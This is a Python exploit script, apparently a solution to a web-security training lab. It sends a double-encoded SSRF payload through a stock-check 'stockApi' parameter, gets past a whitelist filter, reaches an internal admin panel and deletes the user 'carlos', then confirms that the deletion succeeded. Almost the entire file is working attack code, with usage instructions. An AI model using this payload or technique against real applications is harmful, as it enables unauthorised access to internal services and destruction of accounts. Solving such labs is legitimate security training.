#!/usr/bin/python3

# The Main Idea of the Script is that it takes from you vulnarable URL's web server and then Delete the User Carlos from the Admin Panel :)


import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    delete_user_url_ssrf_payload = 'http://localhost%23@stock.weliketoshop.net:8080/admin/delete?username=carlos'
    # %23 here is the # char encoded once, and when we put it on the stockApi parameter it will encoded it again, cuz we need it encoded twice :)

    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    admin_ssrf_payload = 'http://localhost%23@stock.weliketoshop.net:8080/admin'
    params2 = {'stockApi': admin_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)


if __name__ == "__main__":
    main()


# Usage:
	# sudo ./SSRF_with_whitelist-based_input_filter "https://example.com"
	# Note : Don't put slash / at the end of the URL cuz we already did it for you on the script :)
